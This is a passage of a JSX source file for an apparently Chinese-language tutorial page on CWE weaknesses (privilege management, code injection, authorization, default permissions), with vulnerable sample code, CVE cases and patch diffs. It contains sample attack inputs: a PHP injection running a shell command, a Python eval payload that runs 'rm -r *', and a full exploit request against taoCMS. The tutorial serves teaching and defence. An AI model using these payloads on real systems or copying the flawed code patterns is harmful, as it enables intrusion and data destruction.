                    `Exploit``Patch`：@[https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md]@
                </X.Uli>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/269.html">
                【C】CWE-269: Improper Privilege Management
            </X.H2>
            <X.P>权限管理不当，程序没有正确地管理用户的权限。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="python"
                code={`
                def makeNewUserDir(username):
                    if invalidUsername(username):
                        #avoid CWE-22 and CWE-78
                        print('Usernames cannot contain invalid characters')
                        return False

                    try:
                        raisePrivileges()
                        os.mkdir('/home/' + username)
                        lowerPrivileges()
                    except OSError:
                        print('Unable to create new user directory for user:' + username)
                        return False

                    return True
                `}
            />
            <X.P>
                上述代码先提高权限以创建文件夹，然后立刻降回来。但如果`os.mkdir()`发生了异常，就不会调用`lowerPrivileges()`，---
                这时程序会在提高的权限下运行，可能导致进一步被利用。
            </X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="java"
                code={`
                public enum Roles
                {
                    ADMIN,OPERATOR,USER,GUEST
                }

                public void resetPassword(User requestingUser, User user, String password)
                {
                    if (isAuthenticated(requestingUser))
                    {
                        switch (requestingUser.role)
                        {
                        case GUEST:
                            System.out.println("You are not authorized to perform this command");
                            break;
                
                        case USER:
                            System.out.println("You are not authorized to perform this command");
                            break;
                
                        default:
                            setPassword(user, password);
                            break;
                        }
                    }
                    else
                    {
                        System.out.println("You must be logged in to perform this command");
                    }
                }
                `}
            />
            <X.P>
                这个系统定义了不同等级的用户，`ADMIN`和`OPERATOR`都可以重置密码。系统设计的初衷是想让`OPERATOR`拥有稍弱于`ADMIN`的权限；---
                然而既然`OPERATOR`可以修改密码，那么就可以通过重置`ADMIN`账号的密码来控制一个管理员账号。此例的权限管理是有缺陷的。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2017-11747[https://www.opencve.io/cve/CVE-2017-11747]@</X.Uli>
                <X.Uli>`Exploit`：@[https://github.com/tinyproxy/tinyproxy/issues/106]@</X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e]@
                </X.Uli>
                <X.P withMarginTop>
                    Tinyproxy
                    1.8.4及更早版本中的`main.c`会在向非`root`帐户下放权限后创建`/run/tinyproxy/tinyproxy.pid`文件，---
                    这可能允许本地用户在`root`脚本执行`kill \`cat /run/tinyproxy/tinyproxy.pid\``命令之前，---
                    利用访问该非`root`帐户的权限来修改`tinyproxy.pid`，从而杀死任意进程。
                </X.P>
                <X.CodeBlock
                    language="c"
                    diffRemovedLines="21-29"
                    diffAddedLines="1-9"
                    code={`
                    /* Create pid file before we drop privileges */
                    if (config.pidpath) {
                            if (pidfile_create (config.pidpath) < 0) {
                                    fprintf (stderr, "%s: Could not create PID file.\\n",
                                             argv[0]);
                                    exit (EX_OSERR);
                            }
                    }

                    /* Switch to a different user if we're running as root */
                    if (geteuid () == 0)
                            change_user (argv[0]);
                    else
                            log_message (LOG_WARNING,
                                         "Not running as root, so not changing UID/GID.");
                    /* Create log file after we drop privileges */
                    if (setup_logging ()) {
                            exit (EX_SOFTWARE);
                    }

                    /* Create pid file after we drop privileges */
                    if (config.pidpath) {
                            if (pidfile_create (config.pidpath) < 0) {
                                    fprintf (stderr, "%s: Could not create PID file.\\n",
                                             argv[0]);
                                    exit (EX_OSERR);
                            }
                    }
            
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/94.html">
                【B】CWE-94: Improper Control of Generation of Code ('Code Injection')
            </X.H2>
            <X.P>
                当产品允许用户输入包含代码语法的内容时，攻击者有可能以改变产品预期控制流的方式编写代码。这种改变可能导致任意代码的执行。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="php"
                code={`
                $MessageFile = "messages.out";
                if ($_GET["action"] == "NewMessage")
                {
                    $name = $_GET["name"];
                    $message = $_GET["message"];
                    $handle = fopen($MessageFile, "a+");
                    fwrite($handle, "<b>$name</b> says '$message'<hr>\\n");
                    fclose($handle);
                    echo "Message Saved!<p>\\n";
                }
                else if ($_GET["action"] == "ViewMessages")
                {
                    include($MessageFile);
                }
                `}
            />
            <X.P>
                这段代码尝试将用户消息写入消息文件并允许用户查看它们。开发者可能希望文件只包含数据，然而攻击者可以构造以下参数：
            </X.P>
            <X.CodeBlock
                language="text"
                code={`
                name=h4x0r
                message=%3C?php%20system(%22/bin/ls%20-l%22);?%3E
                `}
            />
            <X.P>这会被解析成：</X.P>
            <X.CodeBlock language="php" code='<?php system("/bin/ls -l");?>' />
            <X.P>这将导致用户查看他们的时候，PHP代码被解析执行。注意这种情况下，同样存在XSS漏洞风险。</X.P>
            <X.H3>Example 2</X.H3>
            <X.CodeBlock
                language="python"
                code={`
                def main():
                    sum = 0
                    numbers = eval(input("Enter a space-separated list of numbers: "))
                    for num in numbers:
                        sum = sum + num
                    print(f"Sum of {numbers} = {sum}")
                main()
                `}
            />
            <X.P>
                `eval`函数会执行用户输入的代码，一个可以注入的载荷是`__import__('subprocess').getoutput('rm -r *')`。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2023-1947[https://www.opencve.io/cve/CVE-2023-1947]@</X.Uli>
                <X.Uli>`Exploit`：@[https://gitee.com/misak7in/cve/blob/master/taocms.md]@</X.Uli>
                <X.P withMarginTop>taoCMS 3.0.2存在代码注入漏洞，发送请求：</X.P>
                <X.CodeBlock
                    language="text"
                    code={`
                    POST /admin/admin.php HTTP/1.1
                    Host: www.taocms.com
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
                    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
                    Accept-Encoding: gzip, deflate
                    Content-Type: application/x-www-form-urlencoded
                    Content-Length: 161
                    Origin: http://www.taocms.com
                    Connection: close
                    Referer: http://www.taocms.com/admin/admin.php?action=category&ctrl=add
                    Cookie: PHPSESSID=3p2h8g38ejqf1402s5i384b7h0
                    Upgrade-Insecure-Requests: 1
                    X-Forwarded-For: 127.0.0.1
                    X-Originating-IP: 127.0.0.1
                    X-Remote-IP: 127.0.0.1
                    X-Remote-Addr: 127.0.0.1
                    
                    name=%27%29%29%3Bphpinfo%28%29%3B%2F*&nickname=22&fid=&cattpl=&listtpl=&distpl=&intro=33&orders=&status=1&action=category&id=&ctrl=save&Submit=%E6%8F%90%E4%BA%A4
                    `}
                />
                <X.P>请求的参数解析后是：</X.P>
                <X.CodeBlock language="text" code="name='));phpinfo();/*&nickname=..." />
                <X.P>内容会被写入`cat_array.inc`文件：</X.P>
                <X.CodeBlock
                    language="php"
                    code={`
                    <?php 
                    $cats=array(
                    0=>array(
                    'name'=>'未分组',
                    'status'=>0,
                    'orders'=>0,
                    'id'=>0),
                    7=>array(
                    'name'=>''));phpinfo();/*

                    ...*/
                    `}
                />
                <X.P>后面的内容被注释。文件在`/wap/index.php`被引入，从而可以获取系统配置。</X.P>
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/863.html">【C】CWE-863: Incorrect Authorization</X.H2>
            <X.P>错误的授权，没有正确验证用户是否有权访问资源。</X.P>
            <X.H3>Example 1</X.H3>
            <X.CodeBlock
                language="php"
                highlightLines="1"
                code={`
                $role = $_COOKIES['role'];
                if (!$role)
                {
                    $role = getRole('user');
                    if ($role)
                    {
                        // save the cookie to send out in future responses
                        setcookie("role", $role, time() + 60 * 60 * 2);
                    }
                    else
                    {
                        ShowLoginScreen();
                        die("\\n");
                    }
                }
                if ($role == 'Reader')
                {
                    DisplayMedicalHistory($_POST['patient_ID']);
                }
                else
                {
                    die("You are not Authorized to view this record\\n");
                }
                `}
            />
            <X.P>修改cookie即可绕过授权。</X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2024-22208[https://www.opencve.io/cve/CVE-2024-22208]@</X.Uli>
                <X.Uli>
                    `Exploit`：@[https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9hhf-xmcw-r3xg]@
                </X.Uli>
                <X.Uli>
                    `Patch`：@[https://github.com/thorsten/phpMyFAQ/commit/a34d94ab7b1be9256a9ef898f18ea6bfb63f6f1e]@
                </X.Uli>
                <X.P withMarginTop>
                    phpMyFAQ v3.2.5前的`Sharing
                    FAQ`功能可以给其他邮箱分享讯息，前端只有`5`个输入框（希望用户最多分享给`5`个邮箱），---
                    然而后端并没有对数量做限制，攻击者可以构造请求发送大量邮件。
                </X.P>
                <X.P>部分补丁的内容：</X.P>
                <X.CodeBlock
                    language="php"
                    diffRemovedLines="6"
                    diffAddedLines="10-18"
                    code={`
                    case 'sendtofriends':
                        $postData = json_decode(file_get_contents('php://input'), true, 512, JSON_THROW_ON_ERROR);

                        $author = trim((string) Filter::filterVar($postData['name'], FILTER_SANITIZE_SPECIAL_CHARS));
                        $email = Filter::filterVar($postData['email'], FILTER_VALIDATE_EMAIL);
                        $link = trim((string) Filter::filterVar($postData['link'], FILTER_VALIDATE_URL));
                        $attached = trim((string) Filter::filterVar($postData['message'], FILTER_SANITIZE_SPECIAL_CHARS));
                        $mailto = Filter::filterArray($postData['mailto[]']);

                        $faqLanguage = trim((string) Filter::filterVar($postData['lang'], FILTER_SANITIZE_SPECIAL_CHARS));
                        $faqId = trim((string) Filter::filterVar($postData['faqId'], FILTER_VALIDATE_INT));
                        $categoryId = trim((string) Filter::filterVar($postData['categoryId'], FILTER_VALIDATE_INT));

                        if (is_array($mailto) && count($mailto) > 5) {
                            $response->setStatusCode(Response::HTTP_BAD_REQUEST);
                            $response->setData(['error' => Translation::get('err_sendMail')]);
                            break;
                        }
                    `}
                />
            </X.HighlightBlock>
            <X.H2 href="https://cwe.mitre.org/data/definitions/276.html">
                【B】CWE-276: Incorrect Default Permissions
            </X.H2>
            <X.P>
                错误的默认权限。指软件系统、应用程序、文件或资源在创建时被分配了不适当的默认权限。这些默认权限可能过于宽松，---
                允许未授权的用户或进程进行不必要或有害的访问和操作，从而导致潜在的安全漏洞。
            </X.P>
            <X.H3>Example 1</X.H3>
            <X.P>
                软件在安装或初始化时，通常会创建一些文件、目录或资源。这些资源会被分配默认的权限（读、写、执行权限等）。
            </X.P>
            <X.P>
                如果这些默认权限设置得过于宽松，比如允许所有用户都具有读写权限，那么未授权的用户可能会访问、修改或删除这些文件，导致数据泄露、篡改或破坏。
            </X.P>
            <X.HighlightBlock bgcolor="blue">
                <X.H3>Example in real-world project</X.H3>
                <X.Uli>OpenCVE：@CVE-2005-1941[https://www.opencve.io/cve/CVE-2005-1941]@</X.Uli>
                <X.Uli>`Exploit`：@[https://bugs.gentoo.org/93558]@</X.Uli>
                <X.P withMarginTop>
                    0.9.5-r1版本之前的SilverCity安装了`cgi-styler-form.py`、`cgistyler.py`和`source2html.py`，---
                    具有`world writable`权限。
                </X.P>
                <X.CodeBlock
                    language="text"
                    code={`
                    # ls -l /usr/bin/*.py
                    -rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py
                    -rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py
                    -rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py
                    `}
                />
            </X.HighlightBlock>
        </>
    );
}
